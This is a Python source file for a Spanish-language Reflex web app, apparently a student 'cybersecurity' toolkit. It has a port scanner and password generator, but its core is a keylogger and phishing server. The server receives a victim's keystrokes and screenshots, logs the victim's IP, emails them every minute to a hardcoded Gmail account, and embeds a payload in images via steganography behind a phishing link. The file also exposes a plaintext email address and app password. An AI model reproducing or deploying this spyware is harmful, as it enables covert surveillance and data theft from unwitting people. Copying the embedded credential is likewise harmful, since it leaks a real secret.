import reflex as rx
import nmap
import asyncio
from asyncio import Future
import random
import string
from rxconfig import config
from typing import Dict, List, Optional, Any, Callable
import os
import time
import threading
import struct
import json
import netifaces
import socket
import stepic
from PIL import Image
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import io
import re
import csv
import asyncio
import time
import os
import json
import netifaces
import threading
import reflex as rx
from typing import List, Dict, Optional
import base64
import hashlib
from pynput import keyboard
import asyncio
from scapy.all import sniff, Ether, ARP, sendp, IP, TCP, UDP, Raw
import logging
from typing import List, Dict, Optional
from pydantic import BaseModel
import logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
from scapy.layers.http import HTTPRequest, HTTPResponse
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.all import srp, sendp, sniff
from scapy.all import conf
from scapy.all import get_if_hwaddr
from scapy.all import get_if_list
from fastapi.staticfiles import StaticFiles
# keylogger
from typing import List, Dict, Optional
import os
import io
import time
import uuid
import base64
import asyncio
import threading
from datetime import datetime
from pynput import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from PIL import Image
import stepic
import reflex as rx
from fastapi import FastAPI, Request, Response
from fastapi.responses import FileResponse
from pydantic import BaseModel
import socket
import os
import reflex as rx
from fastapi import Request, Response, FastAPI, status
from pydantic import BaseModel
from typing import Optional
import asyncio
import threading
import time
from pydantic import BaseModel
from reflex import app
from fastapi.middleware.cors import CORSMiddleware 
from fastapi import FastAPI, Request, Response, status
from fastapi.responses import FileResponse
from fastapi.middleware.cors import CORSMiddleware
import reflex as rx
import os
from pydantic import BaseModel
from typing import Optional
import asyncio
import threading
import time
import base64
import uuid
from datetime import datetime
from fastapi import FastAPI, Request, Response, status, Header
from reflex import get_state
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
import stat




# Configuración básica
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# Crear directorios si no existen
for directory in ["assets", "captures", "public", "logs"]:
    path = os.path.join(BASE_DIR, directory)
    os.makedirs(path, exist_ok=True)
    
    
shared_state = {
    "is_keylogging": False,
    "keystrokes": "",
    "screenshots": [],
    "victim_ip": "",
    "last_update": "",
}


    
class ActivatePayload(BaseModel):
    active: bool

class KeylogPayload(BaseModel):
    key: str
    timestamp: str

class ScreenshotPayload(BaseModel):
    screenshot: str
    timestamp: str

class PhishingQuery(BaseModel):
    img: str


#keylogger

# Configuración de correo
EMAIL_CONFIG = {
    "sender": "fernandogarciahernandezveli@gmail.com",
    "receiver": "fernandogarciahernandezveli@gmail.com",
    "app_password": "cuod mpng nuoj bhps",  # Considera usar variables de entorno para contraseñas
    "smtp_server": "smtp.gmail.com",
    "smtp_port": 587
}

    
class State(rx.State):
    """El estado de la aplicación."""
    # Variables generales
    target_ip: str = ""  # IP objetivo único para todos los escaneos
    specific_port: str = ""  # Puerto específico
    range_start: str = ""  # Inicio del rango
    range_end: str = ""  # Fin del rango
    open_ports: list = []  # Puertos abiertos encontrados
    scan_status: str = ""  # Estado del escaneo
    is_loading: bool = False  # Indicador de carga
    menu_open: bool = False  # Estado para el menú desplegable

    # Variables para generación de contraseñas
    password_length: str = ""  # Longitud de la contraseña
    password_count: str = ""  # Cantidad de contraseñas
    generated_passwords: List[Dict[str, str]] = []  # Lista de contraseñas generadas con su seguridad
    password_status: str = ""  # Mensaje de estado para el generador
    is_generating: bool = False  # Indicador de generación de contraseñas

    # Estado del keylogger
    is_keylogging: bool = False
    victim_ip: str = ""
    last_update: str = ""
    keystrokes: str = ""
    screenshots: List[str] = []

    # Estado de la interfaz
    uploaded_image: str = ""
    phishing_link: str = ""
    keylogger_script: str = ""
    server_ip: str = ""
    server_port: int = 3000
    filename: str = ""  # Aquí defines filename como una cadena vacía inicialmente

    def get_full_phishing_link(self):
        return f"http://localhost:3000/{self.phishing_link}"

    async def get_keystrokes(self):
        """Devuelve las pulsaciones capturadas."""
        await self.refresh_keystrokes()  # Asegura que los datos estén actualizados
        return {"keystrokes": self.keystrokes}

    async def get_screenshots(self):
        """Devuelve la lista de capturas de pantalla."""
        await self.refresh_screenshots()  # Asegura que los datos estén actualizados
        return {"screenshots": self.screenshots}
    

    



    async def scan_specific_port(self):
        """Escanea un puerto específico en la IP objetivo."""
        if not self.target_ip or not self.specific_port:
            self.scan_status = "Por favor, ingrese una IP y un puerto válido."
            yield
            return

        self.scan_status = "Escaneando puerto específico..."
        self.is_loading = True
        yield

        await asyncio.sleep(2)

        nm = nmap.PortScanner()
        try:
            nm.scan(self.target_ip, arguments=f'-p {self.specific_port}')
            open_ports = []
            if 'tcp' in nm[self.target_ip] and int(self.specific_port) in nm[self.target_ip]['tcp']:
                if nm[self.target_ip]['tcp'][int(self.specific_port)]['state'] == 'open':
                    open_ports.append(int(self.specific_port))
            self.open_ports = open_ports
            self.scan_status = "Escaneo específico completo."
        except Exception as e:
            self.scan_status = f"Error en el escaneo: {str(e)}"
        finally:
            self.is_loading = False
            yield

    async def scan_port_range(self):
        """Escanea un rango de puertos en la IP objetivo."""
        if not self.target_ip or not self.range_start or not self.range_end:
            self.scan_status = "Por favor, ingrese una IP y un rango válido."
            yield
            return

        self.scan_status = "Escaneando rango de puertos..."
        self.is_loading = True
        yield

        await asyncio.sleep(3)

        nm = nmap.PortScanner()
        try:
            nm.scan(self.target_ip, arguments=f'-p {self.range_start}-{self.range_end}')
            open_ports = []
            for proto in nm[self.target_ip].all_protocols():
                lport = nm[self.target_ip][proto].keys()
                for port in lport:
                    if nm[self.target_ip][proto][port]['state'] == 'open':
                        open_ports.append(port)
            self.open_ports = open_ports
            self.scan_status = "Escaneo de rango completo."
        except Exception as e:
            self.scan_status = f"Error en el escaneo: {str(e)}"
        finally:
            self.is_loading = False
            yield

    def set_interface(self, interface: str):
        """Establece la interfaz de red seleccionada."""
        self.interface = interface

    async def scan_all_ports(self):
        """Escanea todos los puertos (1-65535) en la IP objetivo."""
        if not self.target_ip:
            self.scan_status = "Por favor, ingrese una dirección IP válida."
            yield
            return

        self.scan_status = "Escaneando todos los puertos..."
        self.is_loading = True
        yield

        await asyncio.sleep(5)

        nm = nmap.PortScanner()
        try:
            nm.scan(self.target_ip, arguments='-p 1-65535')
            open_ports = []
            for proto in nm[self.target_ip].all_protocols():
                lport = nm[self.target_ip][proto].keys()
                for port in lport:
                    if nm[self.target_ip][proto][port]['state'] == 'open':
                        open_ports.append(port)
            self.open_ports = open_ports
            self.scan_status = "Escaneo completo de todos los puertos."
        except Exception as e:
            self.scan_status = f"Error en el escaneo: {str(e)}"
        finally:
            self.is_loading = False
            yield



    async def generate_passwords(self):
        """Genera contraseñas seguras y evalúa su seguridad."""
        try:
            length = int(self.password_length)
            count = int(self.password_count)

            if length < 8:
                self.password_status = "La longitud mínima debe ser 8 caracteres."
                self.generated_passwords = []
                yield
                return

            self.password_status = "Generando contraseñas..."
            self.is_generating = True
            yield

            await asyncio.sleep(1)

            letters = string.ascii_letters
            digits = string.digits
            special_chars = "!@#$%^&*()_+-=[]{}|;:,.<>?"
            all_chars = letters + digits + special_chars

            passwords = []
            for _ in range(count):
                password = (
                    random.choice(string.ascii_uppercase) +
                    random.choice(string.ascii_lowercase) +
                    random.choice(digits) +
                    random.choice(special_chars) +
                    ''.join(random.choice(all_chars) for _ in range(length - 4))
                )
                password_list = list(password)
                random.shuffle(password_list)
                password = ''.join(password_list)

                strength = self.evaluate_password_strength(password)
                passwords.append({"text": password, "strength": strength})

            self.generated_passwords = passwords
            self.password_status = f"{count} contraseñas generadas exitosamente."
            self.is_generating = False
            yield
        except ValueError:
            self.password_status = "Ingrese valores numéricos válidos."
            self.generated_passwords = []
            self.is_generating = False
            yield


    def evaluate_password_strength(self, password: str) -> str:
        """Evalúa la seguridad de una contraseña."""
        score = 0
        if len(password) >= 12:
            score += 2
        elif len(password) >= 8:
            score += 1
        if any(c.isupper() for c in password):
            score += 1
        if any(c.islower() for c in password):
            score += 1
        if any(c.isdigit() for c in password):
            score += 1
        if any(c in string.punctuation for c in password):
            score += 1

        if score <= 2:
            return "Débil"
        elif score <= 4:
            return "Media"
        else:
            return "Fuerte"
    
    def toggle_menu(self):
        """Alterna el estado del menú desplegable."""
        self.menu_open = not self.menu_open

    def toggle_sniff_mode(self):
        """Alterna entre modos de captura (por conteo o por tiempo)."""
        if self.sniff_mode == "packet_count":
            self.sniff_mode = "time"
        else:
            self.sniff_mode = "packet_count"

    def toggle_sniff_mode(self):
        if self.sniff_mode == "continuous":
            self.sniff_mode = "packet_count" 
        elif self.sniff_mode == "packet_count":
            self.sniff_mode = "time"
        else:
            self.sniff_mode = "continuous"

    def set_capture_time(self, value):
        """Actualiza el tiempo de captura."""
        self.capture_time = value

    def toggle_packet_content(self, packet_id: str):
        """Muestra u oculta el contenido de un paquete."""
        current = self.show_packet_content.get(packet_id, False)
        self.show_packet_content = {**self.show_packet_content, packet_id: not current}

    def set_victim_ip(self, value):
            self.victim_ip = value


    def generate_phishing_link(image_name: str) -> str:
        return f"http://192.168.0.44:8000/phishing?img={image_name}"

    def _save_image_with_script(image_data, filename):
        image_path = os.path.join(BASE_DIR, "assets", filename)
        with open(image_path, "wb") as f:
            f.write(image_data)
        # Ajustar permisos a 755
        os.chmod(image_path, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
        print(f"Imagen guardada con permisos 755: {image_path}")
        return image_path

    class KeyloggerInterface:
        """Clase para manejar la interfaz del keylogger mejorada."""
    
    # Método para actualizar automáticamente la UI cada segundo
    
    async def auto_update_ui(self):
        """Actualiza automáticamente la interfaz cada segundo."""
        while True:
            # Actualizar estado del keylogger y captura de pantalla
            await self.refresh_keystrokes()
            await self.refresh_screenshots()
            await asyncio.sleep(1)  # Esperar 1 segundo

    # Esta función se ejecutará al inicializar el componente
    async def initialize(self):
        """Inicializa el estado de la aplicación y comienza actualizaciones automáticas."""
        # Inicializar estado base
        self.server_ip = self._get_local_ip()
        
        # Crear directorios necesarios
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        for directory in ["logs", "captures", "assets"]:
            dir_path = os.path.join(base_dir, directory)
            if not os.path.exists(dir_path):
                os.makedirs(dir_path)
        
        # Cargar datos guardados previamente
        await self.refresh_keystrokes()
        await self.refresh_screenshots()
        
        # Iniciar actualizaciones automáticas de UI
        await self.auto_update_ui()
        
        # Si el keylogger estaba activo, iniciar hilo de correo
        if self.is_keylogging:
            self._start_email_thread()
    # Definir los observadores para actualizaciones en tiempo real
    @rx.var
    def get_keylogger_status(self) -> str:
        """Devuelve el estado actual del keylogger como texto."""
        if self.is_keylogging:
            return "✅ Activo"
        else:
            return "❌ Inactivo"
    
    @rx.var
    def get_keylogger_status_color(self) -> str:
        """Devuelve el color del estado del keylogger."""
        if self.is_keylogging:
            return "#4ADE80"  # verde
        else:
            return "#F87171"  # rojo
    
    @rx.var
    def get_full_phishing_link(self) -> str:
        """Devuelve el enlace de phishing completo con IP y puerto."""
        if self.phishing_link:
            # Garantizar que tenemos una IP válida
            ip = self.server_ip if self.server_ip else self._get_local_ip()
            return f"http://{ip}:{self.server_port}{self.phishing_link}"
        return ""
    
    def _get_local_ip(self) -> str:
        """Obtiene la IP local del servidor."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"  # Fallback a localhost
    
    def toggle_menu(self):
        """Alterna la visibilidad del menú desplegable."""
        self.menu_open = not self.menu_open
    
    async def initialize(self):
        """Inicializa el estado de la aplicación al cargar."""
        # Obtener la IP local para enlaces
        self.server_ip = self._get_local_ip()
        
        # Crear directorios necesarios
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        for directory in ["logs", "captures", "assets"]:
            dir_path = os.path.join(base_dir, directory)
            if not os.path.exists(dir_path):
                os.makedirs(dir_path)
        
        # Cargar cualquier dato guardado previamente
        await self.refresh_keystrokes()
        await self.refresh_screenshots()
        
        # Si el keylogger estaba activo, iniciar el hilo de correo
        if self.is_keylogging:
            self._start_email_thread()
    
    def _start_email_thread(self):
        """Inicia el hilo para enviar correos electrónicos periódicamente."""
        thread = threading.Thread(target=self._send_email_periodically, daemon=True)
        thread.start()
        return thread
    
    async def get_screenshot_filename(self, path: str) -> str:
        """Obtiene el nombre del archivo de una ruta."""
        return os.path.basename(path)
    
    async def start_keylogger(self):
        """Inicia el keylogger y configura el envío de correos."""
        if not self.is_keylogging:
            self.is_keylogging = True
            self.last_update = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            # Iniciar el hilo para enviar correos periódicamente
            self._start_email_thread()
            return {"status": "keylogger started"}
        return {"status": "keylogger already running"}

    async def stop_keylogger(self):
        """Detiene el keylogger y limpia el estado."""
        if self.is_keylogging:
            self.is_keylogging = False
            self.victim_ip = ""
            self.last_update = ""
            # No limpiamos los keystrokes ni las capturas para poder revisarlos después
            return {"status": "keylogger stopped"}
        return {"status": "keylogger already stopped"}

    def _send_email_periodically(self):
        """Función para enviar correos electrónicos periódicamente."""
        while self.is_keylogging:
            try:
                self._send_email()
                time.sleep(60)  # Enviar correo cada minuto
            except Exception as e:
                print(f"Error en el envío periódico de correos: {str(e)}")

    def _send_email(self):
        try:
            msg = MIMEMultipart()
            msg['From'] = EMAIL_CONFIG["sender"]
            msg['To'] = EMAIL_CONFIG["receiver"]
            msg['Subject'] = f"Reporte de Keylogger - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            body = f"""
            IP de la víctima: {self.victim_ip}
            Última actualización: {self.last_update}
            Pulsaciones capturadas:
            {self.keystrokes}
            """
            msg.attach(MIMEText(body, 'plain'))
            log_file = os.path.join(BASE_DIR, "logs", "keystrokes.txt")
            
            # Asegurarse de que el directorio logs tenga permisos correctos
            os.makedirs(os.path.dirname(log_file), exist_ok=True)
            
            # Escribir keystrokes en el archivo
            with open(log_file, "w", encoding="utf-8") as f:
                f.write(self.keystrokes)
            
            # Adjuntar el archivo
            with open(log_file, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", "attachment; filename=keystrokes.txt")
                msg.attach(part)
            
            # Adjuntar capturas de pantalla
            for screenshot_path in self.screenshots[-5:]:
                abs_path = os.path.join(BASE_DIR, screenshot_path.lstrip('/'))
                if os.path.exists(abs_path):
                    with open(abs_path, "rb") as attachment:
                        part = MIMEBase("image", "png")
                        part.set_payload(attachment.read())
                        encoders.encode_base64(part)
                        filename = os.path.basename(abs_path)
                        part.add_header("Content-Disposition", f"attachment; filename={filename}")
                        msg.attach(part)
            
            # Enviar el correo
            server = smtplib.SMTP(EMAIL_CONFIG["smtp_server"], EMAIL_CONFIG["smtp_port"])
            server.starttls()
            server.login(EMAIL_CONFIG["sender"], EMAIL_CONFIG["app_password"])
            server.sendmail(EMAIL_CONFIG["sender"], EMAIL_CONFIG["receiver"], msg.as_string())
            server.quit()
            print(f"Correo enviado exitosamente a {EMAIL_CONFIG['receiver']}")
        except Exception as e:
            print(f"Error al enviar correo: {str(e)}")

    async def refresh_keystrokes(self):
        """Actualiza las pulsaciones desde el archivo."""
        logs_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "logs")
        log_file = os.path.join(logs_dir, "keystrokes.txt")
        try:
            if os.path.exists(log_file):
                with open(log_file, "r", encoding="utf-8") as f:
                    self.keystrokes = f.read()
            else:
                self.keystrokes = ""
        except Exception as e:
            print(f"Error al refrescar keystrokes: {str(e)}")
            self.keystrokes = ""

    async def refresh_screenshots(self):
        """Actualiza la lista de capturas de pantalla disponibles."""
        captures_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "captures")
        if os.path.exists(captures_dir):
            files = [os.path.join("/captures", f) for f in os.listdir(captures_dir) if f.endswith('.png')]
            self.screenshots = files
        else:
            self.screenshots = []

    # Endpoint para activar/desactivar el keylogger
    async def activate_keylogger_endpoint(self, payload: ActivatePayload, request: Request):
        """Endpoint para activar o desactivar el keylogger."""
        print(f"Endpoint /keylogger_activate called - Active: {payload.active}")
        if payload.active:
            self.victim_ip = request.client.host
            self.last_update = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            await self.start_keylogger()
            return {"status": "keylogger activated", "victim_ip": self.victim_ip}
        else:
            await self.stop_keylogger()
            return {"status": "keylogger deactivated"}

    # Endpoint para registrar pulsaciones de teclas
    async def keylog_endpoint(self, payload: KeylogPayload):
        if self.is_keylogging:  # Usar self.is_keylogging en lugar de shared_state
            log_entry = f"[{payload.timestamp}] {payload.key}\n"
            self.keystrokes += log_entry  # Usar self.keystrokes en lugar de shared_state
            logs_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "logs")
            if not os.path.exists(logs_dir):
                os.makedirs(logs_dir)
            log_file = os.path.join(logs_dir, "keystrokes.txt")
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(log_entry)
        return {"status": "key logged"}

    # Endpoint para guardar capturas de pantalla
    async def screenshot_endpoint(self, payload: ScreenshotPayload):
        print(f"Recibiendo captura - Timestamp: {payload.timestamp}")
        if shared_state["is_keylogging"]:
            try:
                captures_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "captures")
                if not os.path.exists(captures_dir):
                    os.makedirs(captures_dir)
                
                # Decodificar y guardar la imagen
                try:
                    # Esperamos que payload.screenshot tenga formato "data:image/png;base64,DATOS_BASE64"
                    if "," in payload.screenshot:
                        screenshot_data = base64.b64decode(payload.screenshot.split(",")[1])
                    else:
                        screenshot_data = base64.b64decode(payload.screenshot)
                    
                    # Generar nombre único para la captura
                    timestamp_str = datetime.strptime(payload.timestamp, "%Y-%m-%dT%H:%M:%S.%fZ").strftime("%Y%m%d_%H%M%S")
                    filename = f"screenshot_{timestamp_str}_{uuid.uuid4().hex[:6]}.png"
                    
                    # Lista de posibles rutas de guardado
                    possible_paths = [
                        os.path.join(captures_dir, filename),
                        os.path.join(os.path.dirname(captures_dir), "public", "captures", filename),
                        os.path.join("/tmp", filename)
                    ]
                    
                    # Intentar guardar en cada ruta
                    saved = False
                    for screenshot_path in possible_paths:
                        try:
                            # Asegurar que el directorio existe
                            os.makedirs(os.path.dirname(screenshot_path), exist_ok=True)
                            
                            with open(screenshot_path, "wb") as f:
                                f.write(screenshot_data)
                            
                            print(f"Captura guardada en: {screenshot_path}")
                            saved = True
                            break
                        except Exception as e:
                            print(f"Error al guardar en {screenshot_path}: {str(e)}")
                    
                    if not saved:
                        raise Exception("No se pudo guardar la captura en ninguna ubicación")
                    
                    # Añadir a la lista de capturas
                    screenshot_url = f"/captures/{filename}"
                    self.screenshots.append(screenshot_url)
                    
                    # Actualizar la última actividad
                    self.last_update = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    
                    return {"status": "screenshot saved", "path": screenshot_url}
                except Exception as e:
                    print(f"Captura guardada en: {screenshot_path}")
                    shared_state["screenshots"].append(screenshot_url)
                    return {"status": "screenshot saved", "path": screenshot_url}
            except Exception as e:
                print(f"Error al guardar captura: {str(e)}")
                return {"status": "error", "message": str(e)}
        return {"status": "keylogger not active"}

    # Endpoint para descargar imagen
    async def download_image(self, img: str):
        """Endpoint para descargar la imagen."""
        print(f"Endpoint /download_image called - Image: {img}")
        
        # Lista de posibles rutas de la imagen
        possible_paths = [
            os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "assets", img),
            os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "public", "assets", img),
            os.path.join("/tmp", img)
        ]
        
        # Intentar encontrar la imagen en cada ruta
        for image_path in possible_paths:
            if os.path.exists(image_path):
                # Devolver la imagen como FileResponse con descarga automática
                return FileResponse(
                    path=image_path, 
                    media_type="image/png", 
                    filename=img,
                    headers={"Content-Disposition": f"attachment; filename={img}"}
                )
        
        # Si no se encuentra la imagen
        return Response(
            content=f"Imagen no encontrada: {img}",
            media_type="text/plain",
            status_code=404
        )

    async def embed_script_in_image(self, files):
        print("Incrustando script en imagen...")
        if not files or len(files) == 0:
            print("No se proporcionaron archivos")
            return
        
        filename = f"image_{uuid.uuid4().hex[:8]}.png"
        try:
            file_content = files[0]
            image = Image.open(io.BytesIO(file_content))
            server_ip = self.server_ip if self.server_ip else self._get_local_ip()
            server_port = 8000
            
            # Generar payload
            payload = f"""
            // ... (tu payload actual)
            """
            encoded_payload = base64.b64encode(payload.encode()).decode()
            encoded_image = stepic.encode(image, encoded_payload.encode())
            
            output_path = os.path.join(BASE_DIR, "assets", filename)
            os.makedirs(os.path.dirname(output_path), exist_ok=True)
            encoded_image.save(output_path)
            print(f"✅ Imagen guardada en: {output_path}")
            
            # Verificar que el archivo se creó
            if os.path.exists(output_path):
                print(f"✅ Imagen verificada en: {output_path}")
            else:
                print(f"❌ Error: La imagen no se creó en: {output_path}")
            
            self.uploaded_image = f"/assets/{filename}"
            self.phishing_link = f"/phishing?img={filename}"
            full_link = f"http://{server_ip}:{server_port}{self.phishing_link}"
            print(f"✅ Enlace de phishing generado: {full_link}")
            asyncio.create_task(self.start_keylogger())
        
        except Exception as e:
            print(f"❌ Error al procesar la imagen: {str(e)}")
            import traceback
            traceback.print_exc()
            self.uploaded_image = ""
            self.phishing_link = ""



    

def dropdown_menu() -> rx.Component:
    """Menú desplegable transparente diseñado desde cero."""
    return rx.box(
        rx.button(
            "Menú",
            on_click=State.toggle_menu,
            background_color="rgba(31, 41, 55, 0.8)",
            color="white",
            padding="10px 20px",
            border_radius="8px",
            _hover={"background_color": "rgba(55, 65, 81, 0.8)"},
        ),
        rx.cond(
            State.menu_open,
            rx.vstack(
                rx.button(
                    "Inicio",
                    on_click=[rx.redirect("/"), State.toggle_menu],
                    width="100%",
                    background_color="transparent",
                    color="white",
                    border="none",
                    _hover={"background_color": "rgba(55, 65, 81, 0.8)"},
                ),
                rx.button(
                    "Escaneo",
                    on_click=[rx.redirect("/settings"), State.toggle_menu],
                    width="100%",
                    background_color="transparent",
                    color="white",
                    border="none",
                    _hover={"background_color": "rgba(55, 65, 81, 0.8)"},
                ),
                rx.button(
                    "Contraseña",
                    on_click=[rx.redirect("/about"), State.toggle_menu],
                    width="100%",
                    background_color="transparent",
                    color="white",
                    border="none",
                    _hover={"background_color": "rgba(55, 65, 81, 0.8)"},
                ),
                rx.button(
                    "Sniffing",
                    on_click=[rx.redirect("/sniffing"), State.toggle_menu],
                    width="100%",
                    background_color="transparent",
                    color="white",
                    border="none",
                    _hover={"background_color": "rgba(55, 65, 81, 0.8)"},
                ),
                rx.button(
                    "Keylogger",
                    on_click=[rx.redirect("/keylogger"), State.toggle_menu],
                    width="100%",
                    background_color="transparent",
                    color="white",
                    border="none",
                    _hover={"background_color": "rgba(55, 65, 81, 0.8)"},
                ),
                rx.button(
                    "phishing",
                    on_click=[rx.redirect("/phishing"), State.toggle_menu],
                    width="100%",
                    background_color="transparent",
                    color="white",
                    border="none",
                    _hover={"background_color": "rgba(55, 65, 81, 0.8)"},
                ),
                spacing="2",
                padding="10px",
                background_color="rgba(31, 41, 55, 0.8)",
                border_radius="8px",
                box_shadow="0 4px 6px rgba(0, 0, 0, 0.1)",
                backdrop_filter="blur(5px)",
                position="absolute",
                top="50px",
                left="20px",
                width="200px",
                z_index="10",
            ),
        ),
        position="fixed",
        top="20px",
        left="20px",
        z_index="10",
    )

def index() -> rx.Component:
    """Página principal con título, subtítulo y fondo GIF."""
    return rx.box(
        rx.image(src="inicio.gif", position="absolute", width="100%", height="100%", z_index="-1"),
        rx.image(
            src="/tesji.jpg",
            position="absolute",
            bottom="10px",
            right="10px",
            width="100px",
            height="auto",
            border_radius="10px",
            box_shadow="2px 2px 10px rgba(0, 0, 0, 0.5)"
        ),
        dropdown_menu(),
        rx.vstack(
            rx.heading(
                "Ciberseguridad",
                size="9",
                color="white",
                textShadow="2px 2px 4px rgba(0, 0, 0, 0.8)",
            ),
            rx.text(
                "Diseñado exclusivamente con propósitos educativos y prácticos",
                fontSize="1.5em",
                font_style="italic",
                color="white",
                textShadow="1px 1px 3px rgba(0, 0, 0, 0.6)",
            ),
            spacing="5",
            align="center",
            justify="center",
            min_height="100vh",
        ),
        background_image="url('/assets/inicio.gif')",
        background_size="cover",
        background_position="center",
        background_repeat="no-repeat",
    )

def settings_page() -> rx.Component:
    """Página de configuración con escaneo de puertos."""
    return rx.box(
        rx.image(src="hacks.jpg", position="absolute", width="100%", height="100%", z_index="-1"),
        dropdown_menu(),
        rx.container(
            rx.color_mode.button(position="top-right"),
            rx.vstack(
                rx.heading("Configuración - Escáner de Puertos", size="9"),
                rx.input(
                    placeholder="IP objetivo (ej. 192.168.1.1)",
                    on_change=State.set_target_ip,
                    value=State.target_ip,
                    width="300px",
                ),
                rx.grid(
                    rx.vstack(
                        rx.text("Escaneo Específico", font_weight="bold"),
                        rx.input(
                            placeholder="Puerto (ej. 80)",
                            on_change=State.set_specific_port,
                            value=State.specific_port,
                            width="200px",
                        ),
                        rx.button(
                            "Escanear",
                            on_click=State.scan_specific_port,
                            width="200px",
                        ),
                        spacing="2",
                        align="center",
                    ),
                    rx.vstack(
                        rx.text("Escaneo de Rango", font_weight="bold"),
                        rx.hstack(
                            rx.input(
                                placeholder="Inicio (ej. 20)",
                                on_change=State.set_range_start,
                                value=State.range_start,
                                width="90px",
                            ),
                            rx.input(
                                placeholder="Fin (ej. 100)",
                                on_change=State.set_range_end,
                                value=State.range_end,
                                width="90px",
                            ),
                            spacing="2",
                        ),
                        rx.button(
                            "Escanear Rango",
                            on_click=State.scan_port_range,
                            width="200px",
                        ),
                        spacing="2",
                        align="center",
                    ),
                    rx.vstack(
                        rx.text("Escaneo Completo", font_weight="bold"),
                        rx.button(
                            "Escanear Todos",
                            on_click=State.scan_all_ports,
                            width="200px",
                        ),
                        spacing="2",
                        align="center",
                    ),
                    rx.vstack(
                        rx.text(State.scan_status),
                        rx.cond(
                            State.is_loading,
                            rx.image(
                                src="/hacker.gif",
                                alt="Cargando...",
                                width="200px",
                                height="200px",
                            ),
                            rx.box(
                                rx.foreach(
                                    State.open_ports,
                                    lambda port: rx.text(f"Puerto {port} abierto"),
                                ),
                                background_color="#1E3A8A",
                                color="white",
                                border="1px solid #1E40AF",
                                padding="10px",
                                border_radius="8px",
                                width="100%",
                                max_width="200px",
                                min_height="150px",
                            ),
                        ),
                        spacing="2",
                        align="center",
                    ),
                    columns="2",
                    rows="2",
                    gap="20px",
                    width="100%",
                    max_width="600px",
                ),
                spacing="5",
                align="center",
                justify="center",
                min_height="100vh",
            ),
            rx.logo(),
            width="100%",
            max_width="600px",
        ),
        display="flex",
        justify_content="flex-end",
        align_items="center",
        width="100vw",
        height="100vh",
        padding_right="20px",
        background_image="url('https://imgs.search.brave.com/5uNJhaYehGn4IHuruY94y9T_yDER9aOqw7sMtOxDvqM/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9tZWRp/YS5nZXR0eWltYWdl/cy5jb20vaWQvMTMz/Mzg5NjU5OC9lcy9m/b3RvL2Jpb21ldHJp/Yy1leWUtc2Nhbi1h/bmQtbmV0d29yay5q/cGc_cz02MTJ4NjEy/Jnc9MCZrPTIwJmM9/cm1INUYydTJGNkpJ/S2RWNHUxTUx3azlD/a2E0Z0FOaVpfc0s3/TWd1allCMD0')",
        background_size="cover",
        background_position="center",
        background_repeat="no-repeat",
    )

def about_page() -> rx.Component:
    """Página para generar contraseñas seguras."""
    return rx.box(
        rx.image(src="/contraseña.jpeg", position="absolute", width="100%", height="100%", z_index="-1"),
        dropdown_menu(),
        rx.hstack(
            # Lado izquierdo: Inputs y botón
            rx.vstack(
                rx.heading("Contraseñas", size="9", color="white"),
                rx.text("Generador de contraseñas seguras", color="white", fontSize="1.2em"),
                rx.input(
                    placeholder="Longitud (ej. 12, mínimo 8)",
                    on_change=State.set_password_length,
                    value=State.password_length,
                    width="200px",
                    background_color="rgba(255, 255, 255, 0.1)",
                    color="white",
                    border="1px solid rgba(255, 255, 255, 0.3)",
                    _placeholder={"color": "rgba(255, 255, 255, 0.7)"},
                ),
                rx.input(
                    placeholder="Cantidad (ej. 3)",
                    on_change=State.set_password_count,
                    value=State.password_count,
                    width="200px",
                    background_color="rgba(255, 255, 255, 0.1)",
                    color="white",
                    border="1px solid rgba(255, 255, 255, 0.3)",
                    _placeholder={"color": "rgba(255, 255, 255, 0.7)"},
                ),
                rx.button(
                    "Generar",
                    on_click=State.generate_passwords,
                    width="200px",
                    background_color="#3B82F6",
                    color="white",
                    _hover={"background_color": "#60A5FA"},
                ),
                rx.text(State.password_status, color="white"),
                spacing="4",
                align="center",
                padding="20px",
                width="300px",
            ),
            # Lado derecho: Resultados con contraseñas, seguridad y botones de copiar alineados
            rx.vstack(
                rx.text("Contraseñas Generadas", font_weight="bold", color="white"),
                rx.cond(
                    State.is_generating,
                    rx.image(
                        src="/contraseña.gif",
                        alt="Generando...",
                        width="200px",
                        height="200px",
                    ),
                    rx.hstack(
                        rx.vstack(
                            rx.foreach(
                                State.generated_passwords,
                                lambda pwd: rx.hstack(
                                    rx.text(pwd.text, color="white"),  # Usamos .text para acceder al campo
                                    rx.text(
                                        f"({pwd.strength})",  # Usamos .strength para acceder al campo
                                        color=rx.cond(
                                            pwd.strength == "Débil",
                                            "#FF5555",
                                            rx.cond(
                                                pwd.strength == "Media",
                                                "#FFFF55",
                                                "#55FF55"
                                            )
                                        ),
                                        font_style="italic",
                                    ),
                                    spacing="2",
                                    align="center",
                                ),
                            ),
